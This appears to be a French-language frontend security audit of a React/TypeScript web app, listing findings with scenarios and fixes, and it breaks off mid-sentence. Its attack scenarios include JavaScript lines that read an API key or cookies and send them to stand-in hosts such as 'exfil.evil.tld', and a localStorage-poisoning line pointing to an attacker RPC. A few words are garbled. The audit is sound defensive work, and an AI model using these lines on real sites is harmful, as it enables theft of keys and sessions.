# Audit sécurité — Frontend React/TypeScript BuildPact

**Date** : 2026-10-21 · **Périmètre** : `buildpact/src` (239 fichiers `.ts`/`.tsx`) + `vite.config.ts`, `package.json`, `.env.example`, `index.html`, `public/` · **Mode** : lecture seule stricte
**Auteur** : Security Engineer (audit applicatif frontend)

> Aucun fichier du dépôt n'a été modifié. Aucun `npm`, `vite`, `node`, aucun réseau, aucun accès à `node_modules` en exécution.
> Les seules commandes exécutées ont été des lectures (`rg`, `sed`, `git log`) et deux scripts **Python statiques** montés dans `/tmp` (comparaison des clés i18n, vérification des `rel` sur `target="_blank"`). Aucun secret n'est reproduit dans ce rapport.

---

## 1. Périmètre et méthode

### 1.1 Ce qui a été audité

| Zone | Fichiers examinés |
|---|---|
| Points d'entrée | `src/main.tsx`, `src/App.tsx`, `index.html`, `public/push-sw.js` |
| Bibliothèque métier | `src/lib/**` (46 modules : wallet/anchor, profil, médias, pitch, chat, i18n, routage, RPC, gamification, export CSV/QR, réseau) |
| Hooks | `src/hooks/**` (10 hooks) |
| Composants | `src/components/**` (dont `ui/`), `src/pages/**` (dont `premium/`) |
| Styles | `src/styles/premium.css`, `src/index.css` (revue ciblée : usage de `url()`, variables, `data-theme`) |
| Build / config | `vite.config.ts`, `package.json`, `.env.example`, `.gitignore` |
| Bundle produit | `dist/` (lecture seule, pour vérifier ce qui est réellement livré au navigateur) |
| Backend Joi | `supabase/functions/{update-profile,project-write,rpc,chat-moderate,...}` — lus **uniquement** pour vérifier si le front est la dernière ligne de défense ou si le serveur filtre déjà |

### 1.2 Méthode

Recherche active de points d'entrée dangereux sur les 239 fichiers :

```
dangerouslySetInnerHTML · innerHTML · outerHTML · insertAdjacentHTML · eval( · new Function( · document.write
window.open · target="_blank" (sans rel) · postMessage / message · addEventListener('message')
localStorage / sessionStorage (lecture, écriture, JSON.parse) · fetch(url variable) · href={…} / src={…} construits
signMessage(…) · sendTransaction(…) · window.open · import.meta.env · Object.assign / spread sur données non fiables
```

Puis, pour chaque candidat : analyse du **contrôle serveur correspondant** (le front seul ne protège rien : c'est le
principe appliqué par l'équipe dans `project-write` / `update-profile`), vérification de la **réactivité de l'anti-XSS
de React 19** (`sanitizeURL` dans `react-dom`), et relecture des chemins de **concurrence** (double action, état
périmé) et de **Dos navigateur** (N+1, polling, timers, listeners).

### 1.3 Point de méthode important (React 19 neutralise `javascript:`)

`react-dom` 19 applique `sanitizeURL()` à **toute** valeur d'attribut `href` et `src` : un `javascript:…` est
remplacé par `javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`.
Vérifié dans `node_modules/react-dom/cjs/react-dom-client.production.js` (lignes 1385-1390 et 12548-12559).

Conséquence : **le front n'est pas exploitable en XSS stocké via les liens de profil ou de mise à jour**, malgré
l'absence de filtre de schéma côté serveur. Ce point est developpé en F-04 (risque *latent*, pas actif).

---

## 2. Synthèse chiffrée

| Sévérité | Nombre | Constats |
|---|---|---|
| **CRITIQUE** | **0** | — |
| **MAJEUR** | **4** | F-01, F-02, F-03, F-04 |
| **MINEUR** | **10** | F-05 → F-14 |
| **INFO** | **5** | F-15 → F-19 |

**Verdict global : le front BuildPact tient.** Aucun XSS stocké exploitable, aucune fuite de clé privée, aucun
 contournement du périmètre wallet, aucune injection SQL/RPC côté client, aucun secret de production dans le bundle
livré. Les constats MAJEUR sont des **amplificateurs** (jetons et clés stockés dans `localStorage`, absence de CSP)
plutôt que des vulnérabilités directement exploitables : ils ne deviennent dangereux que si une autre faille
s'ouvre.

---

## 3. Tableau des constats

| ID | Sévérité | Titre | Fichier:ligne | CWE |
|---|---|---|---|---|
| F-01 | MAJEUR | Jeton de session chat = bearer token persistant en `localStorage` (24 h) | `src/lib/chatSession.ts:73-95`, `:241` | CWE-922, CWE-312 |
| F-02 | MAJEUR | Clé API BYOK (OpenAI/Anthropic) en clair dans `localStorage` | `src/lib/translation.ts:147-166` | CWE-312, CWE-522 |
| F-03 | MAJEUR | Aucune CSP ni en-têtes de sécurité (défense en profondeur absente) | `index.html:1-32` (absence), pas de `vercel.json` / `public/_headers` | CWE-1021, CWE-693 |
| F-04 | MAJEUR | URL utilisateur dans un `href` sans allowlist de schéma (`javascript:`/`data:` acceptés par `new URL()`) | `src/lib/updates.ts:64-73` · `src/pages/premium/PremiumProfil.tsx:347-352` · `src/lib/profileRemote.ts:36` | CWE-79, CWE-20 |
| F-05 | MINEUR | Sourcemaps « hidden » publiés : code source lisible en production | `vite.config.ts:65` + `dist/assets/*.map` | CWE-540 |
| F-06 | MINEUR | RPC personnalisé (localStorage) utilisé aussi pour les **écritures**, sans validation de schéma | `src/lib/constants.ts:95-120`, `:135-165` | CWE-319, CWE-20 |
| F-07 | MINEUR | Distribution (action irréversible) déclenchée sans confirmation in-app explicite | `src/components/PactCard.tsx:213-231`, `:740` | CWE-285, CWE-841 |
| F-08 | MINEUR | Modales legacy sans `role="dialog"` / `aria-modal` / Échap / piège de focus | `src/components/BuilderDetailModal.tsx:27` + 4 autres | CWE-1021, WCAG 2.1.2 |
| F-09 | MINEUR | Chaînes françaises codées en dur → fuite de langue en session EN | `src/components/EditDescriptionModal.tsx:66,155,169` + 3 autres | — (i18n) |
| F-10 | MINEUR | Requêtes parallèles non bornées vers l'API Tokens (N+1 sans limite) | `src/components/WalletPanel.tsx:186-195` | CWE-400 |
| F-11 | MINEUR | Messages d'erreur internes bruts affichés à l'utilisateur | `src/lib/pacts.ts:117`, `src/components/ErrorBoundary.tsx:150`, `src/hooks/useProjects.ts:111` | CWE-209 |
| F-12 | MINEUR | Aucun `AbortController` : les requêtes continuent après le démontage | `src/lib/profileRemote.ts:195`, `src/lib/media.ts:402` (et les autres `fetch`) | CWE-772 |
| F-13 | MINEUR | `<iframe>` de vidéo sans attribut `sandbox` | `src/components/VideoEmbed.tsx:24-30` | CWE-1021 |
| F-14 | MINEUR | Export CSV sans neutralisation des formules (latent) | `src/lib/csvExport.ts:63-71` | CWE-1236 |
| F-15 | INFO | Clé anon + URL de projet Supabase codées en dur dans le bundle | `src/lib/supabaseClient.ts:11-17` | CWE-798 (par conception) |
| F-16 | INFO | `VITE_TOKENS_API_KEY` : voie d'exposition au build (gardiens présents) | `src/components/WalletPanel.tsx:179` | CWE-798 |
| F-17 | INFO | `dangerouslySetInnerHTML` dans un composant de chart **non utilisé** | `src/components/ui/chart.tsx:79-100` | CWE-79 (latent) |
| F-18 | INFO | Service worker : navigation d'un onglet vers une URL fournie par le payload push | `public/push-sw.js:38-52` | CWE-601 |
| F-19 | INFO | `.env.example` documente une clé privée historiquement publiée (hors périmètre front) | `.env.example:10-12` | CWE-798 |

---

## 4. Détail des constats

### F-01 — MAJEUR — Jeton de session chat : bearer token persistant en `localStorage`

**Fichier** : `src/lib/chatSession.ts:73-95` (lecture), `:241` (écriture) · usage : `src/lib/chat.ts:120-180`

**Constat.** Pour ne pas imposer un popup wallet par message, le chat utilise un **jeton de session signé une fois,
valable 24 h**, stocké dans `localStorage` sous `buildpact_chat_session:<pda>:<wallet>`. Le serveur le revalide à
chaque envoi. L'équipe l'a documenté explicitement (`chatSession.ts:14-26`) : « Quiconque peut le lire (XSS,
extension, poste partagé) peut publier sous ce wallet jusqu'à expiration. »

**Scénario concret.** Un attaquant obtient une exécution de script dans l'origine de l'application — même minime
(un `<a href>` non filtré, une future régression sur un `dangerouslySetInnerHTML`, une extension navigateur) — il
exécute :

```js
Object.keys(localStorage).filter(k => k.startsWith('buildpact_chat_session:'))
  .forEach(k => fetch(localStorage.getItem(k) /* → {message, signature} */,
    { method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ action:'send', wallet:'…', message, signature, projectPda, body:'<message usurpé>' }) }));
```

Résultat : il **publie sous l'identité du wallet de la victime** dans le chat de chaque projet où un jeton est
présent (le jeton est scopé par projet, mais un wallet en tant que founder peut avoir plusieurs jetons). La victime
ne voit rien : aucun popup wallet, aucune notification. Le taux de Limitation serveur limite le volume, pas
l'imposture. Impact produit : faux messages de discussion dans un produit dont la promesse est la **confiance**
entre builders — c'est-à-dire la surface de reputation.

**Pourquoi MAJEUR et pas Critique.** Lattacks ne peut pas seule déplacer de SOL (l'écriture on-chain exige une
signature de transaction, pas un jeton de chat), et l'équipe a posé des garde-fous (scope projet, rate-limit,
révocation serveur datée via `revokeChatSessions()`). Le point faible reste que le jeton est **durable** (24 h),
**hors du `sessionStorage`** (choix assumé) et **en clair**.

**Correctif recommandé** (par ordre de rapport coût/bénéfice).

```ts
// src/lib/chatSession.ts — 1).refresh court et 2) rotation à chaque signature
const TTL_MS = CHAT_SESSION_TTL_HOURS * 60 * 60 * 1000;

// (a) Réduire la durée d'usage local : le TTL serveur reste 24 h, mais le
//     client ne réutilise le jeton que 2 h — au-delà il redemande une signature.
const REUSE_WINDOW_MS = 2 * 60 * 60 * 1000;

export function loadChatSession(projectPda: string, wallet: string): ChatSession | null {
  try {
    const raw = localStorage.getItem(storageKey(projectPda, wallet));
    if (!raw) return null;
    const parsed = JSON.parse(raw) as ChatSession;
    if (typeof parsed?.message !== 'string' || !Array.isArray(parsed?.signature)
        || typeof parsed?.signedAt !== 'number') return null;
    if (Date.now() - parsed.signedAt >= REUSE_WINDOW_MS) return null;
    return parsed;
  } catch { return null; }
}
```

```ts
// 2) Poche applicative en mémoire d'abord : le localStorage ne sert plus
//    que de cache de reprise. Une page ouverte ne lit le jeton du disque
//    que si la session mémoire est vide.
const cacheMemoire = new Map<string, ChatSession>();

export function loadChatSession(projectPda: string, wallet: string): ChatSession | null {
  const cle = storageKey(projectPda, wallet);
  const enMemoire = cacheMemoire.get(cle);
  if (enMemoire) return enMemoire;
  /* … lecture localStorage + validation ci-dessus … */
  cacheMemoire.set(cle, session);
  return session;
}
```

En complément, faire expirer le jeton **côté serveur** au bout de 2 h au lieu de 24 h (le TTL est déjà paramétré
des deux côtés : `CHAT_SESSION_TTL_HOURS` / `SESSION_TTL_HOURS`), et afficher dans le panneau profil le fait que
le jeton est **local** et **révocable globalement**.

---

### F-02 — MAJEUR — Clé API BYOK en clair dans `localStorage`

**Fichier** : `src/lib/translation.ts:147-166` (stockage), `:179-215` (envoi)

**Constat.** La fonctionnalité « votre propre clé (BYOK) » pour la traduction auto stocke la clé de l'utilisateur
dans `localStorage` (`buildpact_translation_byok`), en JSON, **en clair**, puis l'envoie depuis le navigateur vers
`api.openai.com` / `api.anthropic.com` (avec `anthropic-dangerous-direct-browser-access: true`).

**Scénario concret.** Même déclencheur qu'en F-01 (XSS de faible intensité) →

```js
const c = JSON.parse(localStorage.getItem('buildpact_translation_byok'));
fetch('https://exfil.evil.tld/?k=' + encodeURIComponent(c.apiKey));
```

La clé d'API de l'agent (OpenAI ou Anthropic) est **copiée** et facturée à son propriétaire. Sur une clé
d'entreprise, le impact est financier et contractual ; sur une clé à portée large, c'est un accès à des données
tiers. Le même jeton permet en prime de faire passer les requêtes de traduction de la victime pour du trafic
légitime (contournement de rate-limit et détection d'abus).

**Correctif.**

```ts
// src/lib/translation.ts
// 1) Ne JAMAIS persister la clé brute : on ne garde que le provider et un
//    identifiant de session côté serveur (la clé, elle, reste en mémoire).
export interface TranslationByokConfig {
  provider: TranslationProvider;
  /** Jeton opaque émis par l'Edge Function — jamais la clé API brute. */
  sessionId: string;
}

export function saveTranslationByok(config: TranslationByokConfig | null): void {
  try {
    if (config) localStorage.setItem(BYOK_KEY, JSON.stringify(config));
    else localStorage.removeItem(BYOK_KEY);
  } catch { /* non bloquant */ }
}
```

Si le BYOK direct navigateur est un choix produit non négociable, alors **au minimum** : ne pas persister la clé
(`sessionStorage` seulement, et effacer à la fermeture), et avertir explicitement l'utilisateur dans l'UI que sa clé
est stockée en clair sur cet appareil et lisible par toute extension.

---

### F-03 — MAJEUR — Aucune CSP ni en-têtes de sécurité

**Fichier** : `index.html:1-32` (aucune balise `<meta http-equiv="Content-Security-Policy">`) · dépôt : pas de
`vercel.json`, pas de `public/_headers`, pas de middleware de headers.

**Constat.** Le HTML livré ne comporte aucune politique de sécurité, et le déploiement (Vercel) n'en ajoute aucune
par défaut pour une SPA statique :

- pas de `Content-Security-Policy` (rien n'empêche l'exécution d'un script injecté, ni l'envoi de données vers un
  tiers — `connect-src` est ouvert) ;
- pas de `Strict-Transport-Security` ;
- pas de `X-Content-Type-Options: nosniff` ;
- pas de `Referrer-Policy` (par défaut `strict-origin-when-cross-origin`, les URLs de pacte — qui sont des PDAs
  publics — fuient vers les tiers) ;
- pas de `Permissions-Policy` ;
- pas de `frame-ancestors` (le site peut être intégré dans une iframe par un tiers → *clickjacking* sur les boutons
  de transaction).

**Scénario concret.** C'est le **multiplicateur** des constats F-01 et F-02 : sans `connect-src`, un XSS même
minime peut exfiltrer `localStorage` vers un domaine arbitraire sans être bloqué par la politique. Sans
`frame-ancestors`, une page tierce peut afficher l'app dans une iframe et faire cliquer l'utilisateur sur
« Distribute » (F-07) ou « Enregistrer » au moyen d'un overlay.

**Correctif.** Ajouter `public/_headers` (supporté par Vercel pour les fichiers statiques) :

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https:; connect-src 'self' https://*.supabase.co https://api.devnet.solana.com https://api.openai.com https://api.anthropic.com; frame-src https://www.youtube.com https://www.youtube-nocookie.com https://www.loom.com https://player.vimeo.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
  Cross-Origin-Opener-Policy: same-origin
```

et, en parallèle, un `<meta http-equiv="Content-Security-Policy" …>` de repli dans `index.html` (les navigateurs
qui ignorent `_headers` ne sont pas ceux qui bloquent les headers statiques, mais la meta sert de filet pour les
déploiements hors Vercel). **Attention** : `script-src` sans `'unsafe-inline'` casse le runtime React en
production (React inline) — vérifier avec `npm run build` + `npm run check:prod` avant de basculer, ou passer par
des nonce/hash (`vite-plugin-csp`).

---

### F-04 — MAJEUR (latent) — URL utilisateur dans un `href` sans allowlist de schéma

**Fichiers** :
- `src/lib/updates.ts:64-73` — `validateUpdateLink()` : la validation repose sur `new URL(link.trim())`, qui
  **accepte** `javascript:alert(1)` et `data:text/html,…` (ce n'est une URL invalide, c'est une URL d'un autre
  protocole) ;
- `supabase/functions/project-write/index.ts:375-383` — même validation côté serveur (`new URL(link)`) ;
- `supabase/functions/update-profile/index.ts:85-90` — les liens du profil sont stockés **sans aucune validation**
  de protocole (longueur ≤ 300 seulement) ;
- `src/lib/profileRemote.ts:36` — `links: (row.links as Record<string,string>) ?? {}` : aucune contrainte de schéma à
  la lecture ;
- `src/pages/premium/PremiumProfil.tsx:347-352` — rendu : `<a href={profile.links.github} target="_blank" rel="noreferrer">` ;
- `src/components/UpdatesFeed.tsx:143-148` — rendu : `<a href={u.link} target="_blank" rel="noopener noreferrer">`.

**Scénario concret (état actuel).** Un builder enregistre son lien GitHub avec la valeur
`javascript:fetch('https://evil.tld/?c='+document.cookie)` (serveur : accepté, longueur < 300 ; front :
« validé »). La fiche publique de ce builder est ensuite consultée par une cible (juge, investisseur, autre
builder) : le lien est cliquable dans l'annuaire.

**Pourquoi ce n'est PAS un XSS exploitable aujourd'hui.** React 19 applique `sanitizeURL()` aux attributs `href` :
le `javascript:` est remplacé par une URL qui lève une erreur au clic. L'utilisateur voit un lien qui « ne fait
rien ». **Mais :**

1. `data:text/html;base64,…` **n'est pas** bloqué par React. Le clic ouvre une page HTML contrôlée par
   l'attaquant (les navigateurs modernes bloquent la navigation de premier niveau vers `data:` dans Chrome et
   Firefox — mais la protection est du navigateur, pas de l'application, et ne vaut pas un contrôle explicite) ;
2. c'est une **surface de phishing** dans un produit de confiance : un lien « GitHub ↗ » qui ouvre une page qui
   imite l'app ;
3. le jour où une migration de framework, une régression vers `innerHTML`, ou l'export d'un composant vers un rendu
   non-React, la même donnée devient un XSS **sans que rien ne le signale** ;
4. l'incohérence est déjà visible dans le code : `src/lib/profile.ts:21` impose `^https://` pour
   `avatarUrl`/`bannerUrl` (chemin localStorage) mais **rien** pour `links` (ligne 20) ; le chemin distant
   (`profileRemote.ts`) n'impose rien non plus. Trois chemins de lecture, deux règles.

**Correctif — un validateur unique, côté client ET côté serveur.**

```ts
// src/lib/urlSafety.ts (nouveau) — source de vérité unique
const SCHEMAS_AUTORISES = new Set(['http:', 'https:']);

/** true si l'URL est une URL web absolue, sans schéma dangereux. */
export function estUrlWebSure(valeur: string): boolean {
  const s = valeur.trim();
  if (!s || s.length > 500) return false;
  try {
    const u = new URL(s);
    return SCHEMAS_AUTORISES.has(u.protocol);
  } catch {
    return false;
  }
}
```

```ts
// src/lib/updates.ts — remplacer la validation
export function validateUpdateLink(link: string): string | null {
  if (!link.trim()) return null;
  if (link.trim().length > MAX_LINK_LEN) return tr('errors.linkTooLong', { max: MAX_LINK_LEN });
  if (!estUrlWebSure(link)) return tr('errors.linkInvalid');
  return null;
}
```

```ts
// src/pages/premium/PremiumProfil.tsx — ne rendre que ce qui est sûr
const liensAffiches = Object.entries(profile.links)
  .filter(([, v]) => estUrlWebSure(v))
  .map(([k, v]) => [k, v.trim()] as const);
```

Et **côté serveur** (`supabase/functions/update-profile/index.ts` et `project-write/index.ts`), remplacer
`new URL(link)` par le même contrôle de schéma, avec rejet explicite :

```ts
function estUrlWebSure(v: string): boolean {
  try { const u = new URL(v); return u.protocol === 'http:' || u.protocol === 'https:'; }
  catch { return false; }
}
```

Le même garde-fou doit s'appliquer à `avatar_url` / `banner_url` (aujourd'hui acceptés tels quels, y compris
`javascript:` — inoffensif en `<img src>`, mais dangereux le jour où l'URL atterrit dans un `href` ou un
`background-image`).

---

### F-05 — MINEUR — Sourcemaps publiés : code source lisible en production

**Fichier** : `vite.config.ts:65` → `sourcemap: "hidden"` ; observé dans `dist/assets/*.map` (5 fichiers, dont
`index-BN8U5pCR.js.map` à 3,4 Mo, contenant `sourcesContent` = **le code source complet**).

**Scénario.** `sourcemap: "hidden"` supprime seulement la *référence* au fichier `.map` dans le bundle ; les
fichiers `.map` **sont toujours générés** et **déployés** (ils sont dans `dist/`). Toute personne peut donc
télécharger `https://buildpact-solana.vercel.app/assets/index-*.js.map` et lire l'intégralité du code source, y
compris les commentaires — très bavards dans ce dépôt, et ils décrivent précisément l'architecture de sécurité
(les règles de signature, les limites de portée, le modèle de délégation des signatures, les noms de tables
Supabase, les URL des Edge Functions, la présence de buckets de stockage). C'est une cartographie gratuite pour un
attaquant, et un résumé gratis de la logique métier.

**Correctif.**

```ts
// vite.config.ts
build: {
  // Pas de sourcemap en production : le fichier .mappart du bundle public.
  sourcemap: mode === 'development' ? 'inline' : false,
  // …
}
```

Si le débogage prod est un besoin réel, publiez les `.map` **sur un bucket non indexé** (jamais dans `dist/`), avec
une URL signée à durée de vie courte.

---

### F-06 — MINEUR — RPC personnalisé en `localStorage`, utilisé aussi pour les écritures

**Fichier** : `src/lib/constants.ts:95-120` (`readCustomRpc` / `setCustomRpc`), `:135-165` (listes
`READ_RPC_ENDPOINTS` / `WRITE_RPC_ENDPOINTS`)

**Constat.** Le réglage « RPC personnalisé » (power user) lit une URL **depuis `localStorage`** et l'insère **en
tête des deux listes**, y compris `WRITE_RPC_ENDPOINTS`. Aucune validation de schéma : `setCustomRpc()` accepte
n'importe quelle chaîne (`http://…`, `ws://…`, une IP interne).

**Scénario concret.**

1. **Empoisonnement du stockage** (poste partagé, extension, XSS F-01/F-02, ou simple fichier `localStorage`
   synchronisé par le navigateur) : `localStorage.setItem('buildpact_custom_rpc','https://rpc.attaquant.tld')`.
2. L'utilisateur connecte son wallet et lance une transaction (fund/distribute). La **transaction signée** part vers
   le nœud de l'attaquant, qui la voit avant le réseau, peut la **différer**, la **censurer**, la **remettre sous
   forme de transaction concurrente** (front-running : le vault est public, la distribution l'est aussi), ou en
  Fabricate des réponses (`getAccountInfo` truqué → l'UI affiche un solde faux et l'utilisateur décide sur une
   information fausse).
3. Le endpoint est relu **au chargement du module uniquement** : lMallum n'a pas d'effet immédiat → l'utilisateur
   croit avoir « remis à zéro » son réglage sans que l'endpoint ne change.

**Correctif.**

```ts
// src/lib/constants.ts
export function setCustomRpc(url: string): void {
  try {
    const trimmed = url.trim();
    if (!trimmed) { localStorage.removeItem(CUSTOM_RPC_KEY); return; }
    const u = new URL(trimmed);
    // https obligatoire : un RPC en clair, c'est une transaction en clair.
    if (u.protocol !== 'https:') throw new Error('Le RPC doit être en HTTPS.');
    if (u.username || u.password) throw new Error('Identifiants dans l’URL : non supportés.');
    localStorage.setItem(CUSTOM_RPC_KEY, u.origin + u.pathname);
  } catch {
    localStorage.removeItem(CUSTOM_RPC_KEY); // on retombe sur le relais
  }
}
```

Et, plus important : **n'utiliser le RPC personnalisé que pour la lecture** (`READ_RPC_ENDPOINTS`), en laissant les
écritures passer par le relais Supabase (le relais ne relaie que `getVersion`/méthodes autorisées — cf.
`supabase/functions/rpc/allowlist.ts`). C'est la bonne séparation : un endpoint tiers ne doit jamais voir les
transactions signées.

---

### F-07 — MINEUR — Distribution (irréversible) sans confirmation in-app explicite

**Fichier** : `src/components/PactCard.tsx:213-231` (`handleDistribute`), `:740-747` (bouton) — comparer avec
`:645-670` (annulation de pact, qui **a** bien une confirmation `showCancelConfirm`).

**Constat.** « Distribuer » envoie les fonds du vault aux membres : action on-chain **irréversible**. Le clic
déclenche directement `distributeWithReceipt()` ; la seule confirmation est celle du wallet (qui affiche la
transaction, mais pas le détail « 12,34 SOL vers 5 membres » ni le rôle de l'utilisateur dans ce pact). Une
annulation de pact, elle, demande une confirmation explicite.

**Scénario.** Un founder clique « Distribuer » alors que le vault vient d'être alimenté mais qu'une dépendance
conditionnelle (une découpe non validée, un membre en attente de son pourcentage) n'est pas encore visible dans
l'UI. La transaction part. Aucune seconde chance.

**Correctif.** Ajouter une confirmation in-app, alignée sur celle de l'annulation :

```tsx
const [showDistributeConfirm, setShowDistributeConfirm] = useState(false);

// … dans la modale de confirmation :
<strong>{pact.vaultBalanceSol.toFixed(4)} SOL</strong> seront répartis entre{' '}
<strong>{pact.members.length} membres</strong> au prorata de leurs parts.
Cette opération est <strong>irréversible</strong>.

<button type="button" onClick={() => { setShowDistributeConfirm(false); handleDistribute(); }}
        disabled={distributing}>
  {distributing ? t('pactCard.distributing') : t('pactCard.confirmDistribute')}
</button>
```

Et, côté accessibilité, `role="dialog"` + `aria-modal="true"` + gestion d'Échap (voir F-08).

---

### F-08 — MINEUR — Modales legacy sans rôle dialog, sans Échap, sans piège de focus

**Fichiers** : `src/components/BuilderDetailModal.tsx:27-40`, `src/components/EditDescriptionModal.tsx:80-86`,
`src/components/EditMediaModal.tsx`, `src/components/ContactModal.tsx`, `src/components/AddMemberModal.tsx:227`.

**Constat.** Les modales « premium » (`PremiumBuilderDetail.tsx:65-66`, `PremiumSettings.tsx:421-422`,
`PremiumContactDialog.tsx:100-101`, `ProfileSettingsModal.tsx:102-103`) font correctement le travail :
`role="dialog"`, `aria-modal="true"`, écoute d'Échap avec nettoyage du listener. Les modales **legacy** (v1) ne
le font pas : pas de `role`, pas d'`aria-modal`, pas de fermeture au clavier, pas de déplacement du focus à
l'ouverture, pas de restitution du focus à la fermeture.

**Scénario.** Un utilisateur de clavier ouvre « Modifier la description » (une modale qui **déclenche une signature
on-chain**) : le focus reste sur le bouton déclencheur, `Tab` continue de parcourir la page **derrière** la modale,
Échap ne ferme pas. L'utilisateur tabule dans le formulaire invisible et appuie sur « Enregistrer » par accident —
il signe une transaction qu'il ne voyait pas. Le risque n'est pas théorique : c'est le chemin par lequel un
double-action involontaire arrive.

**Correctif.** Extraire un composant unique `Modal` (Radix `Dialog` est déjà une dépendance : `@radix-ui/react-dialog`
est présent dans `package.json` et `src/components/ui/dialog.tsx` existe). Le migrer coûte peu et corrige les cinq
modales d'un coup :

```tsx
import { Dialog, DialogContent, DialogTitle } from './ui/dialog';

// Remplace le <div className="fixed inset-0 …"> existant.
<Dialog open onOpenChange={(o) => !o && onClose()}>
  <DialogContent aria-describedby={undefined}>
    <DialogTitle>{t('editDescription.title')}</DialogTitle>
    {/* … contenu … */}
  </DialogContent>
</Dialog>
```

Radix fournit le rôle, le `aria-modal`, le piège de focus, Échap, le retour du focus et l'inertie du fond.

---

### F-09 — MINEUR — Chaînes françaises codées en dur → fuite de langue

**Fichiers** : `src/components/EditDescriptionModal.tsx:66` (« Connecte un wallet capable de signer une
transaction. »), `:155` (« Fermer » / « Annuler »), `:169` (« Enregistrement… » / « Enregistrer ») ·
`src/lib/projectWrite.ts:59` (`Erreur ${res.status}.`) · `src/lib/pushNotifications.ts:231` (« Aucun abonnement
actif sur cet appareil. ») · `src/lib/anchor.ts:281` (message de timeout).

**Constat.** Le mécanisme i18n est bon (voir §5), mais ces cinq chaînes échappent au dictionnaire. Dans une session
anglaise, l'utilisateur voit du français — dont une modale de signature de transaction.

**Correctif.** Ajouter les clés dans `fr.ts` / `en.ts` (paires de dictionnaires vérifiées synchrones, cf. §5) et
utiliser `t('…')` partout, y compris dans `src/lib/projectWrite.ts` (qui dispose déjà d'un `tr()` local).

---

### F-10 — MINEUR — Requêtes parallèles non bornées vers l'API Tokens

**Fichier** : `src/components/WalletPanel.tsx:186-195` (idem `src/pages/premium/PremiumWalletPanel.tsx:130`)

```ts
const resolved = await Promise.all(
  missing.map(async (tok) => ({ mint: tok.mint, info: await resolveRegistryProfile(tok.mint, apiKey, …) })),
);
```

**Scénario.** Un wallet détenant 40 SPL tokens déclenche **40 requêtes HTTP simultanées** vers `api.tokens.xyz`
(ou vers le relais), sans limite de concurrence, sans `AbortController` (le `cancelled` flag ne fait qu'ignorer le
résultat : les requêtes partent quand même) et sans cache persistant. Effets : saturation du navigateur (6
connexions HTTP/2 par hôte), 429 immédiat, et un coût réseau inutile à chaque changement de liste de tokens.

**Correctif.** Réutiliser le garde-fou déjà présent dans `src/hooks/useProjects.ts` (`mapLimit`) :

```ts
const CONCURRENCE = 4;
const resolved = await mapLimit(missing, CONCURRENCE, async (tok) => ({
  mint: tok.mint,
  info: await resolveRegistryProfile(tok.mint, apiKey, apiBase ? { apiBase } : undefined),
}));
```

et ajouter un `AbortController` dans `resolveRegistryProfile` (déjà un `AbortSignal.timeout` : ajouter un signal
 externe combinable, pour annuler au démontage).

---

### F-11 — MINEUR — Messages d'erreur internes bruts affichés à l'utilisateur

**Fichiers** : `src/lib/pacts.ts:117` (`return msg.length > 140 ? msg.slice(0,140) + '…' : msg`) ·
`src/components/ErrorBoundary.tsx:150` (`{this.state.error.message}`) ·
`src/hooks/useProjects.ts:111`, `:161`, `:505` (`e.message` affiché dans l'état d'erreur) ·
`src/pages/premium/premiumReadError.ts:33` (message PostgREST brut entre parenthèses).

**Scénario.** Un message brut de `web3.js` ou de PostgREST peut contenir des URLs internes, des noms de table, des
fragments de pile ou des chemins (`Error: connect ECONNREFUSED 127.0.0.1:8545`, `relation "builder_profiles" does
not exist`, `TypeError: Cannot read properties of undefined (reading 'getProgramAccounts')`). Affiché à l'écran,
c'est un gratuité d'inventaire pour un attaquant, et une information qui brouille l'image produit devant un jury.

**Correctif.** Ne jamais retomber sur le message brut : journaliser le détail (console / observabilité) et afficher un
texte générique traduit.

```ts
// src/lib/pacts.ts
console.warn('[tx] erreur non classifiée :', msg);
return tr('errors.txUnknown');   // "La transaction a échoué. Réessaie."
```

```ts
// src/hooks/useProjects.ts
setError(tr('errors.loadFailed'));   // le détail reste dans console.error
```

---

### F-12 — MINEUR — Aucun `AbortController` : les requêtes survivent au démontage

**Fichiers** : toutes les fonctions `fetch` de `src/lib/**` (`profileRemote.ts:195`, `media.ts:402`,
`projectWrite.ts:41`, `chat.ts:82`, `contact.ts:65`, `vault.ts:100`, `translation.ts:50`, `updates.ts:131`…)

**Constat.** Le motif « `let cancelled = false` + `if (cancelled) return` » est employé partout : il empêche la mise à
jour d'état (bon), mais **n'annule pas la requête** (le trafic continue, la réponse est jetée). Sur une page qui
change vite (navigation hash), des dizaines de requêtes inutile continuent en parallèle. Le RPC, lui, est plus
sensible : `useProjects` déclenche des scans de programme.

**Correctif.** Propager un `AbortSignal` :

```ts
export async function fetchProfile(wallet: string, signal?: AbortSignal): Promise<BuilderProfile | null> {
  if (!supabase) return null;
  const { data, error } = await supabase.from('builder_profiles').select('*')
    .eq('wallet', wallet).maybeSingle();
  /* … */
}
```

(ou, pour les `fetch` bruts : `{ signal: controleur.signal }` + `controleur.abort()` dans le `cleanup` du `useEffect`).

---

### F-13 — MINEUR — `<iframe>` de vidéo sans `sandbox`

**Fichier** : `src/components/VideoEmbed.tsx:24-30`

**Constat.** L'URL d'embed est correctement restreinte à YouTube/Loom/Vimeo (`parseVideoUrl` +
`toEmbedUrl`, `src/lib/media.ts:253-308`) — l'injection d'un `javascript:` ou d'un hôte tiers y est impossible.
Reste que l'iframe est chargée sans `sandbox`, avec `allow="clipboard-write"` : le tiers intégré dispose de la
permission d'écriture dans le presse-papiers.

**Correctif.**

```tsx
<iframe
  src={embedUrl}
  title={title}
  loading="lazy"
  sandbox="allow-scripts allow-same-origin allow-presentation"
  referrerPolicy="strict-origin-when-cross-origin"
  allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture; fullscreen"
  allowFullScreen
  className="absolute inset-0 h-full w-full border-0"
/>
```

---

### F-14 — MINEUR — Export CSV sans neutralisation des formules (latent)

**Fichier** : `src/lib/csvExport.ts:63-71`

**Constat.** L'échappement RFC 4180 est correct (guillemets doublés, champs citation), mais il ne traite pas les
